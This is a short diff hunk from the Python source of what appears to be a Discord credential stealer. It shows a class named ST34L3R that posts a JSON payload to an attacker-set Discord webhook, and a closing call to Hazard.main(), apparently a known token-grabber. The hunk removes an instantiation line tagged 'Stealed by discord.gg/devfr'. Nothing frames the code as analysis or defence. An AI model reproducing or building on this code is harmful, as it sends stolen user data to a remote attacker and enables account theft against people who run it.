@@ -168,8 +168,4 @@ class ST34L3R():
             "avatar_url": "https://cdn.discordapp.com/attachments/893976653208891404/901794780068081684/stan.gif"
         }
         requests.post(self.WEBHOOK, headers={"content-type": "application/json"}, data=json.dumps(payload).encode())
-
-ST34L3R = ST34L3R(
-    "Stealed by discord.gg/devfr"
-)
 Hazard.main()
